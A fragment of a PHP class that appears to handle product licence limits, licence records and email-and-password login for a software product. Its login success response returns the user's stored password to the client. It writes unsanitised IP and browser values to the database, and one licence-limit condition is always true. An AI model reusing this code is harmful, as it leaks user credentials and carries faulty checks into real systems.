            case 'Plan 02':
                self::$limitOfProductLicence = 20000;
                self::$limitOfProductLicenceBase = 20000;
                break;
            case 'Plan 03':
                self::$limitOfProductLicence = 35000;
                self::$limitOfProductLicenceBase = 35000;
                break;
            case 'Plan 04':
                self::$limitOfProductLicence = 50000;
                self::$limitOfProductLicenceBase = 50000;
                break;
            default:
                self::$limitOfProductLicence = 0;
                self::$limitOfProductLicenceBase = 0;
                break;
        }
    }

    private static function processUserAuthentication($detailsArray, $IdNbOfUsr, $userDetails): void
    {
        /*$data->userdata->_default_->app_id*/
        $app = self::$conOfDatabase->getInstPrdInfById(Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")));
        if (is_array($app) and count($app) > 0) {
            $app = self::$conOfDatabase->getPrdLcnDtlByPrdId(Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")));
            if (_Array::value($app, "ipAddress") && _Array::value($app, "ipAddress") !== _String::removeTags(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "ip"))) {
                self::$conOfDatabase->resetItmFrmLcnByPrdId(
                    Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")),
                    "ipAddress", _Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "ip")
                );
            }
            if (_Array::value($app, "browserNameFull") && _Array::value($app, "browserNameFull") !== _String::removeTags(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "browser"))) {
                self::$conOfDatabase->resetItmFrmLcnByPrdId(
                    Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")),
                    "browserNameFull", _Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "browser")
                );
            }
        }

        if (is_array($userDetails) and count($userDetails) > 0) {
            self::$conOfDatabase->updateIdNbOfPrdOfUsr(
                Number::filterInt($IdNbOfUsr),
                Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id"))
            );

            self::$conOfDatabase->updateUsrLcn(
                Number::filterInt($IdNbOfUsr),
                Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id"))
            );
            self::upgradeLcnLmt(Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")));
            Storage::StreamAsJson(
                array(
                    'message' => 'success', 'login' => 'passed', 'way' => 'email_password', 'log_status' => 'success',
                    'user' => array(
                        'firstName' => $userDetails['firstName'], 'lastName' => $userDetails['lastName'], 'emailAddress' => $userDetails['emailAddress'], 'password' => $userDetails['password']
                    ), 'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                    Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")),
                    _String::removeTags(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "ip")),
                    _String::removeTags(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "browser"))
                )
                )
            );
        } else {
            Storage::StreamAsJson(array('message' => 'error', 'login' => 'failed', 'way' => 'email_password'));
        }
    }

    private static function upgradeLcnLmt(string $prdId)
    {
        $licence = self::$conOfDatabase->getPrdLcnDtlByPrdId($prdId);
        if (Time::getToday() === _Array::value($licence, 'nextUpdate')) {
            if ($licence['limitBase'] !== 2000 || $licence['limitBase'] !== 0 || $licence['limitBase'] !== null) {
                self::$conOfDatabase->upgradeLcnLmt($prdId, $licence['limitBase']);
            }
        }
    }

}